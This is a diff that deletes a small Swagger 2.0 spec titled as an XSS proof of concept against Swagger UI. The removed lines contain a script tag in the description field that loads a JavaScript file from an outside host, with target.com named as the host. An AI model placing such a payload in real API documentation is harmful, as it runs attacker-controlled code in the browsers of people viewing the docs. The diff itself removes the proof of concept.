@@ -1,18 +1,1 @@
-swagger: '2.0'
-info:
-  title: XSS PoC via Swagger UI
-  description: |
-    <script src="https://jerryhttpd.github.io/scripts/xss.js"></script>
-  version: "1.0"
-host: target.com
-basePath: /
-schemes:
-  - https
-paths:
-  /poc:
-    get:
-      summary: XSS Test
-      description: Triggers external script from attacker server
-      responses:
-        '200':
-          description: Successful response
+
